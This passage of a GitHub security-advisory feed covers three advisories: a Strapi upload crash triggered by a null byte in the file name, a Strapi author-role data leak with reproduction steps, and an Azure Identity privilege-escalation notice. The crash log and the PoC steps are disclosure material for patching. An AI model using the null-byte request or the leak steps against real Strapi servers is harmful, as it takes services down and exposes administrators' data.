<p><img alt="image" src="https://github.com/strapi/strapi/assets/8593673/c95278a1-1727-485e-b6f8-276074d9dd42"></p>
<h4 id="reference-log-1">Reference Log 1</h4>
<pre><code>[2024-03-22 10:23:42.629] http: POST /upload (22 ms) 400
node:internal/fs/utils:379
  const err = new ERR_INVALID_ARG_VALUE(
              ^

TypeError [ERR_INVALID_ARG_VALUE]: The argument 'path' must be a string, Uint8Array, or URL without null bytes. Received '/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/public/uploads/replaceme_png_88efe6a165.png\x00'
    at new WriteStream (node:internal/fs/streams:340:5)
    at Object.createWriteStream (node:fs:3123:10)
    at /mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/provider-upload-local/dist/index.js:71:33
    at new Promise (&lt;anonymous&gt;)
    at Object.uploadStream (/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/provider-upload-local/dist/index.js:68:16)
    at Object.uploadStream (/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/plugin-upload/server/register.js:80:35)
    at Object.upload (/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/plugin-upload/server/services/provider.js:16:46)
    at Object.uploadImage (/mnt/storage/Development/GHSA-pm9q-xj9p-96pm/node_modules/@strapi/plugin-upload/server/services/upload.js:220:48) {
  code: 'ERR_INVALID_ARG_VALUE'
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial-of-Service occurs when a service becomes unavailable for users or other services.
By sending a specially-crafted request, the server crashes without restarting. The entire server crashes with the thrown error instead of crashing only the single request and returning error 500 to the user.
Any user with access to the file upload functionality is able to exploit this vulnerability, affecting applications running in both development mode and production mode as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-pm9q-xj9p-96pm">https://github.com/strapi/strapi/security/advisories/GHSA-pm9q-xj9p-96pm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-31217">https://nvd.nist.gov/vuln/detail/CVE-2024-31217</a></li>
<li><a href="https://github.com/strapi/strapi/commit/a0da7e73e1496d835fe71a2febb14f70170135c7">https://github.com/strapi/strapi/commit/a0da7e73e1496d835fe71a2febb14f70170135c7</a></li>
<li><a href="https://github.com/advisories/GHSA-pm9q-xj9p-96pm">https://github.com/advisories/GHSA-pm9q-xj9p-96pm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pm9q-xj9p-96pm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-12T19:38:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@strapi/plugin-content-manager] @strapi/plugin-content-manager leaks data via relations via the Admin Panel]]></title>
        <id>https://github.com/advisories/GHSA-6j89-frxc-q26m</id>
        <link href="https://github.com/advisories/GHSA-6j89-frxc-q26m"/>
        <updated>2024-06-14T11:52:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<ol>
<li>If a super admin creates a collection where an item in the collection has an association to another collection, a user with the Author Role can see the list of associated items they did not create. They should only see their own items that they created, not all items ever created.</li>
</ol>
<h3 id="details">Details</h3>
<p>At the top level every collection shows blank items for an Author if they did not create the item. This is ideal and works great. However if you associate one private collection to another private collection and an Author creates a new item. The pull down should not show the admins list of previously created items. It should be blank unitl they add their own items.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Sign in as Admin. Navigate to content creation.</li>
<li>Select a collection and verify you have items you created there. And that they have associations to other protected collections.</li>
<li>Verify role permissions for your collections are set to CRUD if user created.</li>
<li>Log out and sign in as a unrelated Author.</li>
<li>Navigate to content management and verify you see collections built by admin but empty for you (as expected)</li>
<li>Create a new item as an Author and see the card appear with attributes to fill out.</li>
<li>Use the form pull down for the associations.</li>
<li>Notice that protected collection items from Admin appear in drop down. These should be hidden</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Security vulnerability where authors have access to protected data created by admin. This could be passwords emails or any other item created for the admin's collection. </p>
<p>See images below for more context</p>
<p>Permissions set
<img alt="image" src="https://user-images.githubusercontent.com/364910/265132222-66e85726-5e01-4ad3-901a-809270a7f11b.png"></p>
<p>Good at top level no items seen
<img alt="image" src="https://user-images.githubusercontent.com/364910/265132292-d63fa6df-f32d-48a3-80d0-48a651c570a8.png"></p>
<p>Drop down in Author login can see Admin data
<img alt="image" src="https://user-images.githubusercontent.com/364910/265132393-8105bae2-b45c-4327-b1c6-da093557e64f.png"></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/strapi/strapi/security/advisories/GHSA-6j89-frxc-q26m">https://github.com/strapi/strapi/security/advisories/GHSA-6j89-frxc-q26m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29181">https://nvd.nist.gov/vuln/detail/CVE-2024-29181</a></li>
<li><a href="https://github.com/strapi/strapi/commit/e1dfd4d9f1cab25cf6da3614c1975e4e508e01c6">https://github.com/strapi/strapi/commit/e1dfd4d9f1cab25cf6da3614c1975e4e508e01c6</a></li>
<li><a href="https://github.com/advisories/GHSA-6j89-frxc-q26m">https://github.com/advisories/GHSA-6j89-frxc-q26m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j89-frxc-q26m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-12T19:38:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@azure/identity] Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</id>
        <link href="https://github.com/advisories/GHSA-m5vv-6r4h-3vj9"/>
        <updated>2024-06-13T18:44:18.000Z</updated>
        <content type="html"><![CDATA[<p>Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-35255">https://nvd.nist.gov/vuln/detail/CVE-2024-35255</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499">https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492">https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178">https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d">https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d</a></li>
<li><a href="https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53">https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53</a></li>
<li><a href="https://github.com/advisories/GHSA-m5vv-6r4h-3vj9">https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-11T18:30:50.000Z</published>
    </entry>
</feed>